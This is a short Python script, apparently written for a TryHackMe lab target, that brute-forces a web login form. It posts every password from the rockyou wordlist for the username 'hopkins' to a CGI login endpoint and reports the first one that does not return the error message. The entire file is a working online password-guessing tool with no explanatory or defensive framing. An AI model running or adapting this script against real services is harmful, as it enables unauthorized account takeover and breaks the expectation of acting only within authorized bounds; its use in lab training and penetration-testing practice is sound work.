#!/bin/env python3

import requests

TARGET = "http://sq2.thm:8080/cgi-bin/login.sh"
USERNAME = "hopkins"
WORDLIST = "/usr/share/wordlists/rockyou.txt"  # Change this if needed

def is_login_success(response_text):
    return "Invalid username or password" not in response_text

with open(WORDLIST, "r", encoding="latin-1") as f:
    for line in f:
        password = line.strip()
        data = {
            "username": USERNAME,
            "password": password
        }

        try:
            r = requests.post(TARGET, data=data, timeout=5)
            if is_login_success(r.text):
                print(f"[+] SUCCESS: {USERNAME}:{password}")
                break
            else:
                print(f"[-] Failed: {USERNAME}:{password}")
        except Exception as e:
            print(f"[!] Error: {e}")

